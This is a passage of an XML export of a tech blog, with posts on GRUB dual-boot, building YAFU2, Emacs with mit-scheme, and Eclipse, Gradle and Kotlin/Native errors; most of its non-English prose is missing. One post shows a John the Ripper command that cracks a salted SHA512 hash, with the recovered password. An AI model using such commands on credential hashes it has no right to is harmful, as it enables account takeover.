class="line">menuentry <span class="string">&quot;Windows 11&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ntfs</span><br><span class="line">        <span class="built_in">set</span> root=<span class="string">&#x27;hd1,gpt7&#x27;</span></span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root 1111-A1B2</span><br><span class="line">        insmod chain</span><br><span class="line">        chainloader /EFI/Microsoft/Boot/bootmgfw.efi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>grub-mkconfig -o /boot/grub/grub.cfg</code>  <code>grub.cfg</code></li><li>, grub </li></ol><center> -EOF- </center>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> grub </tag>
            
            <tag> Arch </tag>
            
            <tag> EFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>john the ripper </title>
      <link href="/2023/09/01/john-the-ripper-%E8%A7%A3%E5%AF%86-salted-SHA512/"/>
      <url>/2023/09/01/john-the-ripper-%E8%A7%A3%E5%AF%86-salted-SHA512/</url>
      
        <content type="html"><![CDATA[<blockquote><p>source: <a href="https://github.com/openwall/john/issues/2125#issuecomment-213401203">Possible to crack salted-sha512?</a>  </p></blockquote><p> <code>passowrd + salt</code>  SHA512 , </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=<span class="string">&#x27;dynamic=sha512($p.$s)&#x27;</span> hash.hash</span><br></pre></td></tr></table></figure><p> <code>hash$salt</code> <code>hash.hash</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05</span><br></pre></td></tr></table></figure><p>:<br><code>john --format=&#39;dynamic=sha512($p.$s)&#39; --show hash.hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?:november16</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> john </tag>
            
            <tag> salted </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch Yafu2 </title>
      <link href="/2023/07/25/Arch-%E5%AE%89%E8%A3%85-Yafu2/"/>
      <url>/2023/07/25/Arch-%E5%AE%89%E8%A3%85-Yafu2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>YAFU is the result of an ongoing hobby project to understand how to factor<br>large integers, and how to factor them fast.   </p></blockquote><p><strong>:</strong> <a href="https://www.mersenneforum.org/showthread.php?p=634890">How I install YAFU version 2 onto my Ubuntu Machines by EdH</a><br><strong>Yafu2  thread:</strong> <a href="https://www.mersenneforum.org/showthread.php?t=26681">YAFU 2.0</a></p><h2 id="0-"><a href="#0-" class="headerlink" title="0. "></a>0. </h2><p>, yafu2  </p><h3 id="0-1-GMP"><a href="#0-1-GMP" class="headerlink" title="0.1 GMP"></a>0.1 GMP</h3><ol><li> <a href="https://gmplib.org/download/gmp">https://gmplib.org/download/gmp</a> ( <code>v6.2.1</code>)</li><li></li><li><code>./configure</code><code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://gmplib.org/download/gmp/gmp-6.2.1.tar.bz2</span><br><span class="line">tar jxvf gmp-6.2.1.tar.bz2</span><br><span class="line"><span class="built_in">mv</span> gmp-6.2.1 gmp</span><br><span class="line"><span class="built_in">cd</span> gmp</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure><h3 id="0-2-GMP-ECM"><a href="#0-2-GMP-ECM" class="headerlink" title="0.2 GMP-ECM"></a>0.2 GMP-ECM</h3><ol><li> <a href="https://gitlab.inria.fr/zimmerma/ecm/-/releases">https://gitlab.inria.fr/zimmerma/ecm/-/releases</a>  release ( <code>v7.0.5</code>) (<code>ecm-x.y.z.tar.gz</code>)</li><li></li><li><code>configure</code>  <code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitlab.inria.fr/zimmerma/ecm/uploads/89f6f0d65d3e980cef33dc922004e4b2/ecm-7.0.5.tar.gz</span><br><span class="line">tar zxvf ecm-7.0.5.tar.gz</span><br><span class="line"><span class="built_in">mv</span> ecm-7.0.5 gmp-ecm</span><br><span class="line"><span class="built_in">cd</span> gmp-ecm</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure><h3 id="0-3-msieve"><a href="#0-3-msieve" class="headerlink" title="0.3 msieve"></a>0.3 msieve</h3><ol><li> <a href="https://sourceforge.net/projects/msieve/files/msieve">https://sourceforge.net/projects/msieve/files/msieve</a>  ( <code>v1.53</code>)  (<code>msievexyz_src.tar.gz</code><code>msievexyz.tar.gz</code>)</li><li><code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://sourceforge.net/projects/msieve/files/msieve/Msieve%20v1.53/msieve153_src.tar.gz/download</span><br><span class="line">tar zxvf download</span><br><span class="line"><span class="built_in">mv</span> msieve-1.53 msieve</span><br><span class="line"><span class="built_in">cd</span> msieve</span><br><span class="line">make all</span><br></pre></td></tr></table></figure><h3 id="0-4-ytools"><a href="#0-4-ytools" class="headerlink" title="0.4 ytools"></a>0.4 ytools</h3><ol><li>git clone</li><li> Makefile:<br> <code>CC = gcc-7.3.0</code> &#x3D;&gt; <code>CC = gcc</code>  </li><li><code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:bbuhrow/ytools.git <span class="comment"># or git clone https://github.com/bbuhrow/ytools</span></span><br><span class="line"><span class="built_in">cd</span> ytools</span><br><span class="line">vim Makefile</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="0-5-ysieve"><a href="#0-5-ysieve" class="headerlink" title="0.5 ysieve"></a>0.5 ysieve</h3><ol><li>git clone</li><li><code>make</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:bbuhrow/ysieve.git <span class="comment"># or git clone https://github.com/bbuhrow/ysieve</span></span><br><span class="line"><span class="built_in">cd</span> ysieve</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h2 id="1--Yafu2"><a href="#1--Yafu2" class="headerlink" title="1.  Yafu2"></a>1.  Yafu2</h2><ol><li>git clone <code>git clone git@github.com:bbuhrow/yafu.git</code></li><li> Makefile:<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INC += -I../gmp_install/gmp-6.2.0/<span class="keyword">include</span></span><br><span class="line">LIBS += -L../gmp_install/gmp-6.2.0/lib</span><br><span class="line"></span><br><span class="line">INC += -I../ecm_install/<span class="keyword">include</span>/</span><br><span class="line">LIBS += -L../ecm_install/lib/</span><br></pre></td></tr></table></figure>to<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INC += -I/usr/local/<span class="keyword">include</span>/</span><br><span class="line">LIBS += -L/usr/local/<span class="keyword">include</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment">#INC += -I../ecm_install/include/</span></span><br><span class="line"><span class="comment">#LIBS += -L../ecm_install/lib/</span></span><br></pre></td></tr></table></figure></li><li> <code>lscpu</code>  cpu flag</li><li> <code>yafu.ini</code>  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="attr">threads</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">ggnfs_dir</span>=..\..\ggnfs-bin\x64\</span><br><span class="line"><span class="attr">ecm_path</span>=..\..\gmp-ecm\bin\mingw\ecm.exe</span><br></pre></td></tr></table></figure>to  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">threads</span>=&lt;<span class="comment"># CPU &gt;</span></span><br><span class="line"><span class="attr">ggnfs_dir</span>=../ggnfs/bin/</span><br><span class="line"><span class="attr">ecm_path</span>=/usr/local/bin/ecm</span><br></pre></td></tr></table></figure> <code>ggnfs_dir</code>   </li><li>[]  make  CPU flag,  <code>make NFS=1 USE_SSE41=1 USEAVX2=1</code>, ,  <code>NFS=1</code></li><li><code>make NFS=1</code></li></ol><h2 id="2-Troubleshooting"><a href="#2-Troubleshooting" class="headerlink" title="2 Troubleshooting"></a>2 Troubleshooting</h2><h3 id="2-1-SIQS-c-2448-undefined-reference-to-nextRoots-32k-avx2-intrin"><a href="#2-1-SIQS-c-2448-undefined-reference-to-nextRoots-32k-avx2-intrin" class="headerlink" title="2.1 SIQS.c:2448: undefined reference to &#39;nextRoots_32k_avx2_intrin&#39;"></a>2.1 <code>SIQS.c:2448: undefined reference to &#39;nextRoots_32k_avx2_intrin&#39;</code></h3><p> flag ,  <code>make</code>  <code>make clean</code> +  flag </p><h3 id="2-2-msieve--gzlib-function"><a href="#2-2-msieve--gzlib-function" class="headerlink" title="2.2 msieve  gzlib function"></a>2.2 msieve  gzlib function</h3><p>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_open&#x27;:</span><br><span class="line">savefile.c:(.text+0x132): undefined reference to `gzopen64&#x27;</span><br><span class="line">/usr/bin/ld: savefile.c:(.text+0x23e): undefined reference to `gzopen64&#x27;</span><br><span class="line">/usr/bin/ld: savefile.c:(.text+0x269): undefined reference to `gzopen64&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_close&#x27;:</span><br><span class="line">savefile.c:(.text+0x311): undefined reference to `gzclose&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_write_line&#x27;:</span><br><span class="line">savefile.c:(.text+0x3f9): undefined reference to `gzputs&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_flush&#x27;:</span><br><span class="line">savefile.c:(.text+0x46c): undefined reference to `gzputs&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_eof&#x27;:</span><br><span class="line">savefile.c:(.text+0x339): undefined reference to `gzeof&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_read_line&#x27;:</span><br><span class="line">savefile.c:(.text+0x39c): undefined reference to `gzgets&#x27;</span><br><span class="line">/usr/bin/ld: ../msieve//libmsieve.a(savefile.o): in function `savefile_rewind&#x27;:</span><br><span class="line">savefile.c:(.text+0x499): undefined reference to `gzrewind&#x27;</span><br></pre></td></tr></table></figure><p> yafu  Makefile  <code>LIBS+= -lc -lz</code></p>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
            <tag> yafu2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl2 / ubuntu  Emacs + mit-scheme</title>
      <link href="/2023/02/10/emacs-configuration/"/>
      <url>/2023/02/10/emacs-configuration/</url>
      
        <content type="html"><![CDATA[<blockquote><p> SICP </p></blockquote><h2 id="1--Emacs--mit-scheme"><a href="#1--Emacs--mit-scheme" class="headerlink" title="1  Emacs  mit-scheme"></a>1  Emacs  mit-scheme</h2><p> Emacs,  <code>GNU Emacs 30.0.50</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> snap install emacs --edge --classic</span><br><span class="line"><span class="built_in">sudo</span> apt install mit-scheme</span><br></pre></td></tr></table></figure><h2 id="2--Emacs"><a href="#2--Emacs" class="headerlink" title="2  Emacs"></a>2  Emacs</h2><h3 id="2-1-"><a href="#2-1-" class="headerlink" title="2.1 "></a>2.1 </h3><p></p><ul><li><code>Ctrl + x + f</code> </li><li><code>Ctrl + x + k</code> &#x2F;, </li><li><code>Ctrl + x</code> + <code>o</code> </li><li><code>Ctrl + x + s</code> &#x2F;</li><li><code>Alt + x</code> + <code>cua-mode</code> ,  <code>Ctrl + c</code>  <code>Ctrl + v</code> </li><li><code>Alt + x</code> + <code>eval-buffer</code> , </li><li><code>Ctrl + x + c</code> </li><li> <code>Ctrl + x</code>  <code>Alt + x</code>  Tab &#x2F;</li></ul><h3 id="2-2-"><a href="#2-2-" class="headerlink" title="2.2 "></a>2.2 </h3><ol><li> Emacs ,  <code>emacs</code>  Emacs<br> wsl ,  wsl  windows  linux GUI,  Emacs  </li><li> <code>Ctrl + h</code>  <code>v</code>  <code>user-init-file</code><br><img src="/images/emacs-config-4.jpg" alt="user-init-file"><br>,  <code>~/.emacs</code><br><img src="/images/emacs-config-4.jpg" alt="path"></li><li> <code>Ctrl + x + f</code>  <code>~/.emacs</code> , <br><img src="/images/emacs-config-3.jpg" alt="emacs">  </li><li>  <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;; add the melpa package</span></span><br><span class="line">(<span class="name">require</span> &#x27;package)</span><br><span class="line">(<span class="name">add-to-list</span> &#x27;package-archives</span><br><span class="line">        &#x27;(<span class="string">&quot;melpa&quot;</span> . <span class="string">&quot;https://melpa.org/packages/&quot;</span>) <span class="literal">t</span>)</span><br><span class="line">(<span class="name">package-initialize</span>)</span><br><span class="line">(<span class="name">package-refresh-contents</span>)</span><br></pre></td></tr></table></figure></li><li> Emacs  <code>Alt + x</code> + <code>eval-buffer</code>   </li><li> <code>Alt + x</code> + <code>package-install</code> +  + <code>geiser</code>  geiser  REPL,   </li><li>23</li><li> mit-scheme <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">use-package</span> geiser-mit <span class="symbol">:ensure</span> <span class="literal">t</span>)</span><br><span class="line">(<span class="name">setq</span> geiser-mit-binary <span class="string">&quot;/usr/bin/scheme&quot;</span>)</span><br><span class="line">(<span class="name">setq</span> geiser-active-implementations &#x27;(mit))</span><br></pre></td></tr></table></figure>, geiser-mit-binary  apt ,  <code>which mit-scheme</code> <br></li></ol><h3 id="2-3--"><a href="#2-3--" class="headerlink" title="2.3 [] "></a>2.3 [] </h3><ol><li> <a href="https://emacsthemes.com/"></a> </li><li> <code>Alt + x</code> + <code>package-install</code> +  + <code>&lt;&gt;</code>,  <code>zenburn-theme</code>  <code>vs-dark-theme</code></li><li></li><li> <code>(load-theme &#39;&lt;&gt; t)</code>,  vs dark theme : <code>(load-theme &#39;vs-dark t)</code>,  theme </li><li> Emacs (<code>Alt + x</code> + <code>eval-buffer</code>)</li></ol><h2 id="3-Hello-world"><a href="#3-Hello-world" class="headerlink" title="3 Hello world"></a>3 Hello world</h2><ol><li> <code>Alt + x + f</code>  scm &#x2F;  scm ,  <code>~/sicp/test.scm</code> </li><li> Hello world<br><img src="/images/emacs-config-1.png" alt="hello"></li><li> <code>Alt + x</code> + <code>run-geiser</code>  geiser</li><li>(hello world),  <code>Ctrl + x</code> + <code>o</code> </li><li> Hello world , &#x2F;&#x2F; (<code>Ctrl + b</code> &#x2F; <code>Ctrl + f</code> )</li><li> <code>Ctrl + Alt + x</code> </li><li><br><img src="/images/emacs-config-2.png" alt="result"></li></ol><h2 id="4-"><a href="#4-" class="headerlink" title="4 "></a>4 </h2><p>Emacs : <a href="https://github.com/bluemonk/modern-emacs">https://github.com/bluemonk/modern-emacs</a><br>Emacs : <a href="https://www.masteringemacs.org/article/beginners-guide-to-emacs">https://www.masteringemacs.org/article/beginners-guide-to-emacs</a><br>Hello world: <a href="https://medium.com/@joshfeltonm/setting-up-emacs-for-sicp-from-scratch-daa6473885c5">https://medium.com/@joshfeltonm/setting-up-emacs-for-sicp-from-scratch-daa6473885c5</a><br> Emacs : <code>Ctrl + h</code> + <code>t</code></p><center> EOF </center>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Emacs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eclipse java.lang.NoSuchMethodError: &#39;boolean com.ibm.icu.text.UTF16.isSurrogate(char)&#39;</title>
      <link href="/2023/01/10/eclipse-UTF16.isSurrogate-NoSuchMethodError/"/>
      <url>/2023/01/10/eclipse-UTF16.isSurrogate-NoSuchMethodError/</url>
      
        <content type="html"><![CDATA[<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">!ENTRY org.eclipse.core.jobs 4 2 2023-01-10 14:29:04.005</span><br><span class="line">!MESSAGE An internal error occurred during: &quot;Requesting Java AST from selection&quot;.</span><br><span class="line">!STACK 0</span><br><span class="line">java.lang.NoSuchMethodError: &#x27;boolean com.ibm.icu.text.UTF16.isSurrogate(char)&#x27;</span><br><span class="line">   at org.eclipse.jdt.internal.ui.text.JavaWordFinder.findWord(JavaWordFinder.java:61)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.updateOccurrenceAnnotations(JavaEditor.java:3300)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.lambda$4(JavaEditor.java:3363)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup.calculateASTandInform(SelectionListenerWithASTManager.java:175)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup$1.run(SelectionListenerWithASTManager.java:151)</span><br><span class="line">   at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)</span><br><span class="line"></span><br><span class="line">!ENTRY org.eclipse.core.jobs 4 2 2023-01-10 14:29:04.266</span><br><span class="line">!MESSAGE An internal error occurred during: &quot;Requesting Java AST from selection&quot;.</span><br><span class="line">!STACK 0</span><br><span class="line">java.lang.NoSuchMethodError: &#x27;boolean com.ibm.icu.text.UTF16.isSurrogate(char)&#x27;</span><br><span class="line">   at org.eclipse.jdt.internal.ui.text.JavaWordFinder.findWord(JavaWordFinder.java:61)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.updateOccurrenceAnnotations(JavaEditor.java:3300)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.javaeditor.JavaEditor.lambda$4(JavaEditor.java:3363)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup.calculateASTandInform(SelectionListenerWithASTManager.java:175)</span><br><span class="line">   at org.eclipse.jdt.internal.ui.viewsupport.SelectionListenerWithASTManager$PartListenerGroup$1.run(SelectionListenerWithASTManager.java:151)</span><br><span class="line">   at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>Eclipse IDE for Java Developers (includes Incubating components)<br>Version: 2022-06 (4.24.0)<br>Build id: 20220609-1112<br>openjdk 15</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>,  Eclipse Web Developer Tools <br>Eclipse Web Developer Tools3.26.0.v202204091445org.eclipse.wst.web_ui.feature.feature.group</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p> Eclipse 2022-12  2022-12  Eclipse Web Developer Tools</p>]]></content>
      
      
      <categories>
          
          <category> ErrorSolved </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>org.gradle.internal.remote.internal.MessageIOException: Could not write &#39;/127.0.0.1:&lt;random port&gt;&#39;</title>
      <link href="/2022/12/21/MessageIOException_Could_not_write_127.0.0.1/"/>
      <url>/2022/12/21/MessageIOException_Could_not_write_127.0.0.1/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> Kotlin test ,  junit test  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Unexpected exception thrown.</span><br><span class="line">org.gradle.internal.remote.internal.MessageIOException: Could not write &#x27;/127.0.0.1:&lt;random port&gt;&#x27;.</span><br><span class="line">   at org.gradle.internal.remote.internal.inet.SocketConnection.flush(SocketConnection.java:140)</span><br><span class="line">   at org.gradle.internal.remote.internal.hub.MessageHub$ConnectionDispatch.run(MessageHub.java:333)</span><br><span class="line">   at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)</span><br><span class="line">   at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)</span><br><span class="line">   at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)</span><br><span class="line">   at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)</span><br><span class="line">   at org.gradle.internal.concurrent.ThreadFactoryImpl$ManagedThreadRunnable.run(ThreadFactoryImpl.java:61)</span><br><span class="line">   at java.base/java.lang.Thread.run(Thread.java:832)</span><br><span class="line">Caused by: java.io.IOException: Connection reset by peer</span><br><span class="line">   at java.base/sun.nio.ch.SocketDispatcher.write0(Native Method)</span><br><span class="line">   at java.base/sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:54)</span><br><span class="line">   at java.base/sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:113)</span><br><span class="line">   at java.base/sun.nio.ch.IOUtil.write(IOUtil.java:58)</span><br><span class="line">   at java.base/sun.nio.ch.IOUtil.write(IOUtil.java:50)</span><br><span class="line">   at java.base/sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:506)</span><br><span class="line">   at org.gradle.internal.remote.internal.inet.SocketConnection$SocketOutputStream.writeWithNonBlockingRetry(SocketConnection.java:279)</span><br><span class="line">   at org.gradle.internal.remote.internal.inet.SocketConnection$SocketOutputStream.writeBufferToChannel(SocketConnection.java:267)</span><br><span class="line">   at org.gradle.internal.remote.internal.inet.SocketConnection$SocketOutputStream.flush(SocketConnection.java:261)</span><br><span class="line">   at org.gradle.internal.remote.internal.inet.SocketConnection.flush(SocketConnection.java:138)</span><br><span class="line">   ... 7 more</span><br><span class="line">&gt; Task :jvmTest FAILED</span><br><span class="line">Dec 21, 2022 5:24:30 PM org.junit.platform.launcher.core.EngineDiscoveryOrchestrator lambda$logTestDescriptorExclusionReasons$7</span><br><span class="line">INFO: 0 containers and 1 tests were Method or class mismatch</span><br><span class="line">FAILURE: Build failed with an exception.</span><br><span class="line">* What went wrong:</span><br><span class="line">Execution failed for task &#x27;:jvmTest&#x27;.</span><br><span class="line">&gt; Process &#x27;Gradle Test Executor 2&#x27; finished with non-zero exit value 1</span><br><span class="line">  This problem might be caused by incorrect test process configuration.</span><br><span class="line">  Please refer to the test execution section in the User Manual at https://docs.gradle.org/7.3/userguide/java_testing.html#sec:test_execution</span><br><span class="line">* Try:</span><br><span class="line">&gt; Run with --stacktrace option to get the stack trace.</span><br><span class="line">&gt; Run with --info or --debug option to get more log output.</span><br><span class="line">&gt; Run with --scan to get full insights.</span><br><span class="line">* Get more help at https://help.gradle.org</span><br><span class="line">BUILD FAILED in 2s</span><br></pre></td></tr></table></figure><p>,   </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> test  exit <br>:  </p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    exitProcess(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> test  exit<br>( test ) XD</p>]]></content>
      
      
      <categories>
          
          <category> ErrorSolved </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kotlin/Native lld-link: error: undefined symbol: std::__throw_bad_array_new_length()</title>
      <link href="/2022/10/20/kotlin-native-std-__throw_bad_array_new_length/"/>
      <url>/2022/10/20/kotlin-native-std-__throw_bad_array_new_length/</url>
      
        <content type="html"><![CDATA[<h2 id="0-"><a href="#0-" class="headerlink" title="0. "></a>0. </h2><p> GitHub Workflow   Kotlin&#x2F;Native  link :<br> &amp; GitHub :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os = Windows</span><br><span class="line">compiler = GCC 11.2.0</span><br></pre></td></tr></table></figure><p> GitHub Workflow </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">e: C:\Users\runneradmin\.konan\dependencies\llvm-11.1.0-windows-x64-essentials/bin/clang++ invocation reported errors</span><br><span class="line"></span><br><span class="line">The C:\Users\runneradmin\.konan\dependencies\llvm-11.1.0-windows-x64-essentials/bin/clang++ command returned non-zero exit code: 1.</span><br><span class="line">output:</span><br><span class="line">lld-link: error: undefined symbol: std::__throw_bad_array_new_length()</span><br><span class="line">&gt;&gt;&gt; referenced by &lt;Linked Lib name&gt;.a(ThreadController.cpp.obj):(LibLoader::sendPluginException(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;))</span><br><span class="line">&gt;&gt;&gt; referenced by &lt;Linked Lib name&gt;.a(ThreadController.cpp.obj):(LibLoader::ThreadController::submitJob(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::function&lt;void ()&gt;))</span><br><span class="line">&gt;&gt;&gt; referenced by &lt;Linked Lib 